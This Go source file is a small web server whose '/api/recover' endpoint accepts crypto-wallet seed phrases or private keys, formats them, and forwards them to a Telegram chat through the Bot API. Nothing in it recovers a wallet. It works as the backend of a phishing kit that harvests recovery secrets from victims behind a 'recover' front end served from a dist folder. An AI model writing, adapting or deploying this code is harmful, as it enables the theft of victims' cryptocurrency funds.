package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html/template"
	// "io"
	"log"
	"net/http"
	"net/url"
	"os"
	"github.com/joho/godotenv"

	"github.com/go-chi/chi/v5"
)

type Wallet struct {
	WalletID string   `json:"walletId"`
	Mode     string   `json:"mode"`
	Phrase   []string `json:"phrase"`
}

func main() {

	err := godotenv.Load()
	if err != nil {
		log.Println("No .env file found")
	}


	r := chi.NewRouter()

	dist := http.Dir("./dist")

	fileServer := http.FileServer(dist)

	r.Get("/*", func(w http.ResponseWriter, r *http.Request) {

		path := r.URL.Path

		if _, err := dist.Open(path); err != nil {
			http.ServeFile(w, r, "./dist/index.html")
			return
		}

		fileServer.ServeHTTP(w, r)
	})


	r.HandleFunc("/api/recover", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
			return
		}

		var input Wallet

		if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
			http.Error(w, "Invalid JSON input", http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "invalid input",
			})
			return
		}

		var tmplStr string

		switch input.Mode {

		case "seed":
			tmplStr = `
<b>Wallet Information</b>

Wallet ID : {{ .WalletID }}
Mode      : {{ .Mode }}

<b>Seed Phrases</b>

<pre>
No  | Phrase
----|-------------------------
{{- range $index, $value := .Phrase }}
{{ printf "%-3d | %s" (add1 $index) $value }}
{{- end }}
</pre>
`

		case "privatekey":
			tmplStr = `
<b>Wallet Information</b>

Wallet ID : {{ .WalletID }}
Mode      : {{ .Mode }}

<b>
	{{range $index, $value := .Phrase}}
		<b>{{$value}}</>
	{{end}}
</b>
`

		default:
			http.Error(w, "Unknown walletId", http.StatusBadRequest)
			return
		}

		tmpl := template.Must(
			template.New("wallet").
				Funcs(template.FuncMap{
					"add1": func(i int) int {
						return i + 1
					},
				}).
				Parse(tmplStr),
		)

		w.Header().Set("Content-Type", "text/html")

		var buf bytes.Buffer
		err := tmpl.Execute(&buf, input)
		if err != nil {
			fmt.Println("Error executing template:", err)
			return
		}

		message := buf.String()


		err = sendTelegramMessage(message)
		if err != nil {
			fmt.Println("Error sending telegram message:", err)
			return
		}

		fmt.Println("Telegram message sent successfully")
	})

	log.Println("Server running at http://localhost:8000")
	log.Fatal(http.ListenAndServe(":8000", r))
}


func sendTelegramMessage(message string) error {
	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	data := url.Values{}
	data.Set("chat_id", chatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML") // VERY IMPORTANT

	resp, err := http.PostForm(apiURL, data)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// body, _ := io.ReadAll(resp.Body)

	// fmt.Println("Telegram Response Status:", resp.Status)
	// fmt.Println("Telegram Response Body:", string(body))

	if resp.StatusCode != 200 {
		return fmt.Errorf("telegram returned non-200 status")
	}

	return nil
}